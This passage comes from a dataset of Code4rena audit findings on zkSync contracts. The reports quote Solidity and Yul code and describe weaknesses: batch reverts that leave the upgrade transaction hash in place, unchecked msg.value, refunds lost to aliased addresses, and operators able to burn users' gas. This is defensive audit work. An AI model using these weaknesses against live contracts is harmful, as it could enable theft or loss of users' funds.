chain might become out of sync if it launches while we are in the middle of a protocol upgrade. This would mean they cannot process their genesis upgrade\n        // as thier protocolversion would be outdated, and they also cannot process the protocol upgrade tx as they have a pending upgrade.\n        // 3. The protocol upgrade is increased in the BaseZkSyncUpgrade, in the executor only the systemContractsUpgradeTxHash is checked\n        require(\n            IStateTransitionManager(s.stateTransitionManager).protocolVersion() == s.protocolVersion,\n            \"Executor facet: wrong protocol version\"\n        );\n        // With the new changes for EIP-4844, namely the restriction on number of blobs per block, we only allow for a single batch to be committed at a time.\n        require(_newBatchesData.length == 1, \"e4\");\n        // Check that we commit batches after last committed batch\n        require(s.storedBatchHashes[s.totalBatchesCommitted] == _hashStoredBatchInfo(_lastCommittedBatchData), \"i\"); // incorrect previous batch data\n\n\n        bytes32 systemContractsUpgradeTxHash = s.l2SystemContractsUpgradeTxHash;\n        // Upgrades are rarely done so we optimize a case with no active system contracts upgrade.\n        //@audit\n        if (systemContractsUpgradeTxHash == bytes32(0) || s.l2SystemContractsUpgradeBatchNumber != 0) {\n            _commitBatchesWithoutSystemContractsUpgrade(_lastCommittedBatchData, _newBatchesData);\n        } else {\n            _commitBatchesWithSystemContractsUpgrade(\n                _lastCommittedBatchData,\n                _newBatchesData,\n                systemContractsUpgradeTxHash\n            );\n        }\n\n\n        s.totalBatchesCommitted = s.totalBatchesCommitted + _newBatchesData.length;\n    }\n```\n\nHere we see that the new logic for EIP-4844, requires only one batch to be committed at a time due to restriction of blobs per block, but this doesn't solve the root case, cause regardless, `if (systemContractsUpgradeTxHash == bytes32(0) || s.l2SystemContractsUpgradeBatchNumber != 0)` is `false`, which would be the case for our reverted batch, then the execution **always** routes the logic [to commiting with system contract upgrades](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L239-L245).\n\nTLDR: `revert()` will delete upgrade batch number but not the batch tx thus making reverts of batches with system upgrade **non functional** since the system tx hash may still be executed with new batches.\n\n### Impact\n\nMedium _(reason for submitting as QA attached in the  `### Additional Note` section )_, this is cause for the first case, we show how protocol have timelocked themself from being able to to stop the upgrade to a buggy implementation, that might even have critical bug implementations that an attacker could exploit while they code and attempt deploying a non buggy implementation, and for the second case, similar to the first we can see how if for whatever reason `l2SystemContractsUpgradeTxHash` is to be stopped from executing with a batch, it is not possible to do so, [due to `s.l2SystemContractsUpgradeTxHash` not being reverted in `revertBatches()`](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L490-L494)\n\n### Recommended Mitigation Steps\n\nModify the `revertBatches()` function to ensure comprehensive cleanup after a batch revert. This includes not only resetting the batch number associated with a system contract upgrade but also clearing the related transaction hash (`s.l2SystemContractsUpgradeTxHash`).\nWhile reverting batches both `l2SystemContractsUpgradeBatchNumber` `s.l2SystemContractsUpgradeTxHash` should be provided and deleted.\n\n### Additional Note\n\n> NB: This wasn't intended to be a QA submission, but these lines exist in the readMe:https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/README.md#L35-L38\n\n```markdown\n### Acknowledged issues from the previous audits\n\nAll unfixed issues from the previous audits are considered out of scope.\n- https://era.zksync.io/docs/reference/troubleshooting/audit-bug-bounty.html\n```\n\nNow, whereas navigating to the attached link from the `readMe` we can't see the audit where the idea of this bug has been coined attached, we still assume  that it is part of the _previous_ findings, now we just don't know if this was \"acknowledged\" or \"confirmed\" since we can see that the [team clearly \"confirmed\" the bug case](https://github.com/code-423n4/2023-10-zksync-findings/issues/214#issuecomment-1795027489) and applied a fix to it [in this commit](https://github.com/code-423n4/2024-03-zksync/compare/2023-10-zksync...main) provided for this audit, albeit an insufficient one... due to all these we've decided that this issue somewhat subjective and we'd leave it to the judge if they deem it fit to be be upgraded.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33198",
      "title": "[06] There are currently no assurances that funds specified for operation are rightly matched",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/governance/Governance.sol#L168-L202\n\n```solidity\n    function execute(Operation calldata _operation) external payable onlyOwnerOrSecurityCouncil {\n        bytes32 id = hashOperation(_operation);\n        // Check if the predecessor operation is completed.\n        _checkPredecessorDone(_operation.predecessor);\n        // Ensure that the operation is ready to proceed.\n        require(isOperationReady(id), \"Operation must be ready before execution\");\n        // Execute operation.\n        _execute(_operation.calls);\n        // Reconfirming that the operation is still ready after execution.\n        // This is needed to avoid unexpected reentrancy attacks of re-executing the same operation.\n        require(isOperationReady(id), \"Operation must be ready after execution\");\n        // Set operation to be done\n        timestamps[id] = EXECUTED_PROPOSAL_TIMESTAMP;\n        emit OperationExecuted(id);\n    }\n\n    function executeInstant(Operation calldata _operation) external payable onlySecurityCouncil {\n        bytes32 id = hashOperation(_operation);\n        // Check if the predecessor operation is completed.\n        _checkPredecessorDone(_operation.predecessor);\n        // Ensure that the operation is in a pending state before proceeding.\n        require(isOperationPending(id), \"Operation must be pending before execution\");\n        // Execute operation.\n        _execute(_operation.calls);\n        // Reconfirming that the operation is still pending before execution.\n        // This is needed to avoid unexpected reentrancy attacks of re-executing the same operation.\n        require(isOperationPending(id), \"Operation must be pending after execution\");\n        // Set operation to be done\n        timestamps[id] = EXECUTED_PROPOSAL_TIMESTAMP;\n        emit OperationExecuted(id);\n    }\n\n```\n\nThese function at the long run call the below: https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/governance/Governance.sol#L225-L235\n\n```solidity\n    function _execute(Call[] calldata _calls) internal {\n        for (uint256 i = 0; i < _calls.length; ++i) {\n            (bool success, bytes memory returnData) = _calls[i].target.call{value: _calls[i].value}(_calls[i].data);\n            if (!success) {\n                // Propagate an error if the call fails.\n                assembly {\n                    revert(add(returnData, 0x20), mload(returnData))\n                }\n            }\n        }\n    }\n```\n\nThese functions are used to execute schedule operations either instantly or after their respective delays have passed, now issue is that the public function are marked as `payable` which suggests that while calling these functions, msg.value is going to be passed with them, but in the internal `_execute()` there is no validation that the msg.value provided is equal to the total value of `call[i].value` needed in the loop.\n\n### Impact\n\nPotential having excess funds in the Governance.sol, i.e when the msg.value is way greater than the total call.value needed for the transaction, or not enough funds being available for the execution which then leads to eating up funds that have been sent to the contract for different operations\n\n### Recommended Mitigation Steps\n\nCheck that msg.value == the total call value needed, if protocol plans on routing the logic via the balance too, then check if the `msg.value + contract's balance of eth` is enough for transaction.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33197",
      "title": "[05] Fix typos & documentations _(Multiple instances)_",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\n- Take a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L331-L338\n\n```solidity\n            {\n                // Deposits that happened before the upgrade cannot be checked here, they have to be claimed and checked in the legacyBridge\n                bool weCanCheckDepositHere = !_isEraLegacyWithdrawal(_chainId, _l2BatchNumber);\n                //@audit\n                // Double claims are not possible, as we this check except for legacy bridge withdrawals\n                // Funds claimed before the update will still be recorded in the legacy bridge\n                // Note we double check NEW deposits if they are called from the legacy bridge\n                notCheckedInLegacyBridgeOrWeCanCheckDeposit = (!_checkedInLegacyBridge) || weCanCheckDepositHere;\n            }\n```\n\nEvidently the statement \"Double claims are not possible, as we this except for legacy bridge withdrawals\" is wrong and should be fixed.\n\n- Take a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L115-L136\n\n```solidity\n    /// @dev tranfer tokens from legacy erc20 bridge or mailbox and set chainBalance as part of migration process\n    function transferFundsFromLegacy(address _token, address _target, uint256 _targetChainId) external onlyOwner {\n        if (_token == ETH_TOKEN_ADDRESS) {\n            uint256 balanceBefore = address(this).balance;\n            IMailbox(_target).transferEthToSharedBridge();\n            uint256 balanceAfter = address(this).balance;\n            require(balanceAfter > balanceBefore, \"ShB: 0 eth transferred\");\n            chainBalance[_targetChainId][ETH_TOKEN_ADDRESS] =\n                chainBalance[_targetChainId][ETH_TOKEN_ADDRESS] +\n                balanceAfter -\n                balanceBefore;\n        } else {\n            uint256 balanceBefore = IERC20(_token).balanceOf(address(this));\n            uint256 amount = IERC20(_token).balanceOf(address(legacyBridge));\n            require(amount > 0, \"ShB: 0 amount to transfer\");\n            IL1ERC20Bridge(_target).tranferTokenToSharedBridge(_token, amount);\n            uint256 balanceAfter = IERC20(_token).balanceOf(address(this));\n            require(balanceAfter - balanceBefore == amount, \"ShB: wrong amount transferred\");\n            chainBalance[_targetChainId][_token] = chainBalance[_targetChainId][_token] + amount;\n        }\n    }\n\n```\n\nThis: \" /// @dev transfer tokens from legacy erc20 bridge or mailbox and set chainBalance as part of migration process\"\n\nShould be changed to: \" /// @dev transfer tokens from legacy erc20 bridge or mailbox and set chainBalance as part of migration process\"\n\n- Take a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L188-L195\n\n```solidity\n        // We only require 9 logs to be checked, the 10th is if we are expecting a protocol upgrade\n        // Without the protocol upgrade we expect 9 logs: 2^9 - 1 = 511\n        // With the protocol upgrade we expect 8 logs: 2^10 - 1 = 1023\n        if (_expectedSystemContractUpgradeTxHash == bytes32(0)) {\n            require(processedLogs == 511, \"b7\");\n        } else {\n            require(processedLogs == 1023, \"b8\");\n        }\n```\n\nThis line: `// With the protocol upgrade we expect 8 logs: 2^10 - 1 = 1023`, obviously should be `// With the protocol upgrade we expect **10** logs: 2^10 - 1 = 1023`\n\n- Another instance here https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/bootloader/bootloader.yul#L1498-L1501\n\n```yul\n                        // Here we are making sure that the bytecode is indeed not yet know and needs to be published,\n                        // preveting users from being overcharged by the operator.\n                        let marker := getCodeMarker(bytecodeHash)\n\n```\n\nIt should instead be \"Here we are making sure that the bytecode is indeed not yet **known** and needs to be published\"\n\n- One more instance can be seen here https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/Constants.sol#L43-L47\n\n```solidity\n/// @dev The maximal possible address of an L1-like precompie. These precompiles maintain the following properties:\n/// - Their extcodehash is EMPTY_STRING_KECCAK\n/// - Their extcodesize is 0 despite having a bytecode formally deployed there.\nuint256 constant CURRENT_MAX_PRECOMPILE_ADDRESS = 0xff;\n\n```\n\nEvidently the comment means to say \"/// @dev The maximal possible address of an L1-like **precompile**. These precompiles maintain the following properties:\"... and not `precompie`.\n\n- Another instance can be seen here https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/precompiles/CodeOracle.yul#L68-L71\n\n```yul\n            function decommit(versionedHash, lenInWords) {\n                // The operation below are never expected to overflow since the `lenInWords` is a most 2 bytes long.\n                let gasCost := mul(decommmitCostPerWord(), lenInWords)\n            //..snip\n           }\n\n```\n\nThis line : `The operation below are never expected to overflow since the `lenInWords` is a most 2 bytes long.` should be \"The operation below are never expected to overflow since the `lenInWords` is **at** most 2 bytes long.\"\n\n- Another instance is here https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/precompiles/P256Verify.yul#L4\n\n```yul\n * @notice The contract that emulates RIP-7212's P256VERIFY precompile.\n```\n\n`RIP` should instead be `EIP`\n\n- Another instance is here https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/libraries/SystemContractHelper.sol#L38\n\n```solidity\n * methods won't work for non-system contracts and also breaking changes at short notice are possilbe.\n```\n\n`possilbe` should be `possible`\n\n\n### Impact\n\nBad documentation code structure, making it hard for users/developers to understand code.\n\n### Recommended Mitigation Steps\n\nFix the typos from these instances\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33196",
      "title": "[04] Users tokens could get lost indefinitely",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nThis is a \"bug case\" that's present in two different identified instances by us\n\n- Take a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L554-L603\n\n```solidity\n    function depositLegacyErc20Bridge(\n        address _prevMsgSender,\n        address _l2Receiver,\n        address _l1Token,\n        uint256 _amount,\n        uint256 _l2TxGasLimit,\n        uint256 _l2TxGasPerPubdataByte,\n        address _refundRecipient\n    ) external payable override onlyLegacyBridge nonReentrant returns (bytes32 l2TxHash) {\n        require(l2BridgeAddress[ERA_CHAIN_ID] != address(0), \"ShB b. n dep\");\n        require(_l1Token != l1WethAddress, \"ShB: WETH deposit not supported 2\");\n\n\n        // Note that funds have been transferred to this contract in the legacy ERC20 bridge.\n        if (!hyperbridgingEnabled[ERA_CHAIN_ID]) {\n            chainBalance[ERA_CHAIN_ID][_l1Token] += _amount;\n        }\n\n\n        bytes memory l2TxCalldata = _getDepositL2Calldata(_prevMsgSender, _l2Receiver, _l1Token, _amount);\n\n\n        {\n            //@audit\n            // If the refund recipient is not specified, the refund will be sent to the sender of the transaction.\n            // Otherwise, the refund will be sent to the specified address.\n            // If the recipient is a contract on L1, the address alias will be applied.\n            address refundRecipient = _refundRecipient;\n            if (_refundRecipient == address(0)) {\n                refundRecipient = _prevMsgSender != tx.origin\n                    ? AddressAliasHelper.applyL1ToL2Alias(_prevMsgSender)\n                    : _prevMsgSender;\n            }\n\n\n            L2TransactionRequestDirect memory request = L2TransactionRequestDirect({\n                chainId: ERA_CHAIN_ID,\n                l2Contract: l2BridgeAddress[ERA_CHAIN_ID],\n                mintValue: msg.value, // l2 gas + l2 msg.Value the bridgehub will withdraw the mintValue from the base token bridge for gas\n                l2Value: 0, // L2 msg.value, this contract doesn't support base token deposits or wrapping functionality, for direct deposits use bridgehub\n                l2Calldata: l2TxCalldata,\n                l2GasLimit: _l2TxGasLimit,\n                l2GasPerPubdataByteLimit: _l2TxGasPerPubdataByte,\n                factoryDeps: new bytes[](0),\n                refundRecipient: refundRecipient\n            });\n            l2TxHash = bridgehub.requestL2TransactionDirect{value: msg.value}(request);\n        }\n\n\n        bytes32 txDataHash = keccak256(abi.encode(_prevMsgSender, _l1Token, _amount));\n        // Save the deposited amount to claim funds on L1 if the deposit failed on L2\n        depositHappened[ERA_CHAIN_ID][l2TxHash] = txDataHash;\n\n\n        emit LegacyDepositInitiated(ERA_CHAIN_ID, l2TxHash, _prevMsgSender, _l2Receiver, _l1Token, _amount);\n    }\n```\n\nThis function initiates a deposit by locking funds on the contract and then sending the request, issue here arises whenever the refund is not specified, protocol then goes ahead to assume the refund recipient to be the aliased address of the sender if they are a contract.\n\nNow, key to note that while this function is being called from the L1ERC20Bridge [`msg.sender` is being passed as `prevMsgSender`](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L144-L147), main case here is with the aliasing logic and the fact that there is a high chance that the user has no control over the contract/ the private key for the `AddressAliasHelper.applyL1ToL2Alias(_prevMsgSender) L2 address` and therefore this would lead to their funds being stuck funds in many cases.\n\n- Now consider https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L258-L287\n\n```solidity\n    function _requestL2Transaction(\n        uint256 _mintValue,\n        WritePriorityOpParams memory _params,\n        bytes memory _calldata,\n        bytes[] memory _factoryDeps\n    ) internal returns (bytes32 canonicalTxHash) {\n        require(_factoryDeps.length <= MAX_NEW_FACTORY_DEPS, \"uj\");\n        _params.txId = s.priorityQueue.getTotalPriorityTxs();\n\n        // Checking that the user provided enough ether to pay for the transaction.\n        // Using a new scope to prevent \"stack too deep\" error\n\n        _params.l2GasPrice = _deriveL2GasPrice(tx.gasprice, _params.l2GasPricePerPubdata);\n        uint256 baseCost = _params.l2GasPrice * _params.l2GasLimit;\n        require(_mintValue >= baseCost + _params.l2Value, \"mv\"); // The `msg.value` doesn't cover the transaction cost\n\n        // If the `_refundRecipient` is not provided, we use the `_sender` as the recipient.\n        //@audit\n        address refundRecipient = _params.refundRecipient == address(0) ? _params.sender : _params.refundRecipient;\n        // If the `_refundRecipient` is a smart contract, we apply the L1 to L2 alias to prevent foot guns.\n        if (refundRecipient.code.length > 0) {\n            refundRecipient = AddressAliasHelper.applyL1ToL2Alias(refundRecipient);\n        }\n        _params.refundRecipient = refundRecipient;\n\n        // populate missing fields\n        _params.expirationTimestamp = uint64(block.timestamp + PRIORITY_EXPIRATION); // Safe to cast\n        _params.valueToMint = _mintValue;\n\n        canonicalTxHash = _writePriorityOp(_params, _calldata, _factoryDeps);\n    }\n```\n\nWe can see that a similar logic could be applied here, cause the contract during it's execution includes a refund recipient, now if it's set to `address(0)` _(assuming this to be the default behavior)_. The transaction on L2 fails, and a refund should be issued. However, because the refund recipient is msg.sender (the L2 contract), the refund goes to the L2 contract's address. The original sender from L1 does not receive the refund, resulting in a potential loss of funds in this case too.\n\n### Impact\n\nUsers funds would be inacessible/stuck since they are not in control of the aliased address.\n\n### Recommended Mitigation Steps\n\nThis is a pretty old bug case, where protocols assume that the msg.sender is in control of their addresses or aliased ones on another chain, which led to the famous [20M OP wintermute hack](https://rekt.news/wintermute-rekt/) from 2022, best way imo to fix this would be that while depositing via `deposit(...)` if `_prevMsg.sender` is a contract and no explicit `refundRecipient` is specified, just revert the call.\n\n### Additional Note\n\n- [Article from Rekt](https://rekt.news/wintermute-rekt/) &\n- [Code4rena's bug report based on a similar ground](https://github.com/code-423n4/2023-09-maia-findings/issues?q=is%3Aissue+is%3Aopen+if+the+Virtual+Account%27s+owner+is+a+Contract+Account+%28multisig+wallet%29%2C+attackers+can+gain+control+of+the+Virtual+Accounts+by+gaining+control+of+the+same+owner%27s+address+in+a+different+chain)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33195",
      "title": "[03] The new `require(dictionary.length / 8 <= encodedData.length / 2)` check allows malicious operators to always pass in malformed data to the bootloader to ensure that all users gas gets burnt without executing the tx.",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/Compressor.sol#L44-L70\n\n```solidity\n    function publishCompressedBytecode(\n        bytes calldata _bytecode,\n        bytes calldata _rawCompressedData\n    ) external payable onlyCallFromBootloader returns (bytes32 bytecodeHash) {\n        unchecked {\n            (bytes calldata dictionary, bytes calldata encodedData) = _decodeRawBytecode(_rawCompressedData);\n\n\n            require(\n                encodedData.length * 4 == _bytecode.length,\n                \"Encoded data length should be 4 times shorter than the original bytecode\"\n            );\n\n\n            require(\n                dictionary.length / 8 <= encodedData.length / 2,\n                \"Dictionary should have at most the same number of entries as the encoded data\"\n            );\n\n\n            for (uint256 encodedDataPointer = 0; encodedDataPointer < encodedData.length; encodedDataPointer += 2) {\n                uint256 indexOfEncodedChunk = uint256(encodedData.readUint16(encodedDataPointer)) * 8;\n                require(indexOfEncodedChunk < dictionary.length, \"Encoded chunk index is out of bounds\");\n\n\n                uint64 encodedChunk = dictionary.readUint64(indexOfEncodedChunk);\n                uint64 realChunk = _bytecode.readUint64(encodedDataPointer * 4);\n\n\n                require(encodedChunk == realChunk, \"Encoded chunk does not match the original bytecode\");\n            }\n        }\n```\n\nThe `publishCompressedBytecode()` function has been updated, and here is the new implementation https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/Compressor.sol#L44-L70, in comparison to the previous implementation, it no longer enforces multiple checks, i.e the `dictionary.length % 8 = 0` and the check where the dictionary's length `< 2** 16` this is done so that protocol can correctly enforce more that the reason why a call to this function fails would be due to gas from the bootloader, but there is a new check that faults this logic , i.e `require(dictionary.length / 8 <= encodedData.length / 2)`, issue with this is that this check does not allow the bootloader to correctly enforce that calls to this functiion would mostly fail due to the gas provided not being enough and might still cause the attempt to forcefully revert https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/bootloader/bootloader.yul#L1740-L1745 i.e an operator passing in a data that does not always fall as \"correct\" within the checks, for example say the new check of `dictionary.length / 8 <= encodedData.length / 2` is false, would lead to the `sendCompressedBytecode()` in the bootloader near calling and burning all the gas.\n\n### Impact\n\nHaving it in mind that the `sendCompressedBytecode()` function is called by the bootloader whenever there is a need for the L2 transaction to use packed bytecode as seen here https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/bootloader/bootloader.yul#L1506 , this then gives the operator the opportunity of burning all of the user's provided gas of any L2 transaction that needs packed/published bytecodes... potentially doing it constantly if the operator is malicious since all they need to do is tamper with the data they pass to the bootloader to ensure the compression always ends up malformed by ignoring the new `dictionary.length/8` check and then all users attempt just burn their gas.\n\n### Recommended Mitigation Steps\n\nSince this enforcement `dictionary.length / 8 <= encodedData.length / 2` still needs to be placed so as not to allow operator pass in an excessive length, then the near calling should be scrapped from the bootloader when an attempt to `sendCompressedBytecode()` is made, i.e if the compression is malformed the attempt should instead revert with reason rather than burning all the gas.\n\n**Additional Notes**\n\n> NB: This wasn't intended to be a QA submission, but these lines exist in the readMe: https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/README.md#L31-L34\n\n```markdown\nValidator can provide inefficient bytecode compression\n\nIn the current implementation, the mechanism for bytecode compression is not strictly unambiguous. That means the validator has the flexibility to choose a less efficient compression for the bytecode to increase the deployment cost for the end user. Besides that, there is another non-fixed [issue](https://github.com/code-423n4/2023-10-zksync-findings/issues/805), that gives a way for the operator to forces the user to pay more for the bytecode compression or even burn all the transaction gas during bytecode compression verification.\n```\n\nNow we assume the above snippet makes this issue somewhat subjective as we could argue it makes it stand on the lines of being OOS, If all parties think otherwise then this should be upgraded.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33194",
      "title": "[02] Bootloader wrongly identifies the `RIGHT_PADDED_GET_ACCOUNT_VERSION_SELECTOR` as not attached with the `Contract Deployer` deployment execution",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/bootloader/bootloader.yul#L1937-L1961\n\n```yul\n            function shouldMsgValueMimicCallBeSystem(to, dataPtr) -> ret {\n                let dataLen := mload(dataPtr)\n                // Note, that this point it is not fully known whether it is indeed the selector\n                // of the calldata (it might not be the case if the `dataLen` < 4), but it will be checked later on\n                let selector := shr(224, mload(add(dataPtr, 32)))\n\n                let isSelectorCreate := or(\n                    eq(selector, {{CREATE_SELECTOR}}),\n                    eq(selector, {{CREATE_ACCOUNT_SELECTOR}})\n                )\n                let isSelectorCreate2 := or(\n                    eq(selector, {{CREATE2_SELECTOR}}),\n                    eq(selector, {{CREATE2_ACCOUNT_SELECTOR}})\n                )\n\n                // Firstly, ensure that the selector is a valid deployment function\n                ret := or(\n                    isSelectorCreate,\n                    isSelectorCreate2\n                )\n                // Secondly, ensure that the callee is ContractDeployer\n                ret := and(ret, eq(to, CONTRACT_DEPLOYER_ADDR()))\n                // Thirdly, ensure that the calldata is long enough to contain the selector\n                ret := and(ret, gt(dataLen, 3))\n            }\n```\n\nThis function returns whether the mimicCall should use the `isSystem` flag, note that his flag should only be used for contract deployments and nothing else, now navigating to the bootloaders preprocess script here https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/scripts/preprocess-bootloader.ts, we can see that, not all contract deployments selectors would be tagged with the flag, note that this is the intended behaviour since calls to the deployer system contract are the only ones allowed to be system calls.\n\n```json\n...\n  RIGHT_PADDED_GET_ACCOUNT_VERSION_SELECTOR: getPaddedSelector(\"ContractDeployer\", \"extendedAccountVersion\"),\n...\n  CREATE_SELECTOR: getSelector(\"ContractDeployer\", \"create\"),\n  CREATE2_SELECTOR: getSelector(\"ContractDeployer\", \"create2\"),\n  CREATE_ACCOUNT_SELECTOR: getSelector(\"ContractDeployer\", \"createAccount\"),\n  CREATE2_ACCOUNT_SELECTOR: getSelector(\"ContractDeployer\", \"create2Account\"),\n...\n\n```\n\nEvidently there are 5 contract deployment functionalities attached with the bootloader's preprocessor, but only 4 of those would be tagged with the `isSystem` flag in the bootloader, since the \"extendedAccountVersion\" has not been attached.\n\n### Impact\n\nThe current implementation of the `bootloader::shouldMsgValueMimicCallBeSystem` would wrongly assume that the contract deployment of the \"extendedAccountVersion\" is not a system call, i.e [this instance of using the `isSystem` flag in the bootloader](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/bootloader/bootloader.yul#L1972) wrongly assumes that this is not a system call, making the ABI returned by `getFarCallABI()` for low-level innvocations of calls and mimicCalls wrong.\n\nThe route for this logic is : `executeL1Tx-> msgValueSimulatorMimicCall -> shouldMsgValueMimicCallBeSystem /mimicCallOnlyResult -> getFarCallABI `\n\n> Submitting this as QA, leaving to the judge to upgrade if they see fit\n\n### Recommended Mitigation Steps\n\nInclude the `RIGHT_PADDED_GET_ACCOUNT_VERSION_SELECTOR` in `bootloader::shouldMsgValueMimicCallBeSystem` as an `isSystem` call.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33193",
      "title": "[01] Genesis upgrades, currently do not fully work as intended",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nBased on documentations on how genesis upgrades should work, the transaction is to return the hash of the L2 system contract upgrade transaction after it's execution.\n\nNow, take a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgradeGenesis.sol#L46-L68\n\n```solidity\n\n    function upgrade(ProposedUpgrade calldata _proposedUpgrade) public virtual override returns (bytes32) {\n        // Note that due to commitment delay, the timestamp of the L2 upgrade batch may be earlier than the timestamp\n        // of the L1 block at which the upgrade occurred. This means that using timestamp as a signifier of \"upgraded\"\n        // on the L2 side would be inaccurate. The effects of this \"back-dating\" of L2 upgrade batches will be reduced\n        // as the permitted delay window is reduced in the future.\n        require(block.timestamp >= _proposedUpgrade.upgradeTimestamp, \"Upgrade is not ready yet\");\n\n        _setNewProtocolVersion(_proposedUpgrade.newProtocolVersion);\n        _upgradeL1Contract(_proposedUpgrade.l1ContractsUpgradeCalldata);\n        _upgradeVerifier(_proposedUpgrade.verifier, _proposedUpgrade.verifierParams);\n        _setBaseSystemContracts(_proposedUpgrade.bootloaderHash, _proposedUpgrade.defaultAccountHash);\n\n        bytes32 txHash = _setL2SystemContractUpgrade(\n            _proposedUpgrade.l2ProtocolUpgradeTx,\n            _proposedUpgrade.factoryDeps,\n            _proposedUpgrade.newProtocolVersion\n        );\n\n        _postUpgrade(_proposedUpgrade.postUpgradeCalldata);\n\n        emit UpgradeComplete(_proposedUpgrade.newProtocolVersion, txHash, _proposedUpgrade);\n    }\n```\n\nThis function is an overriden one of the inherited `BaseZkSyncUpgrade.upgrade()`, case here is that unlike the inherited version where the bytes data to be returned [has been explicitly mentioned as `txHash`](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L67), this function does not explicitly name the variable to be returned, leading to all attempts of calling this function to return `0`.\n\n### Minimalistic POC\n\nDeploying this contract on remix proves this bug case\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.20;\n\ncontract BaseContract {\n    function upgrade(bytes memory _proposedUpgrade) public virtual pure returns (bytes32 txHash) 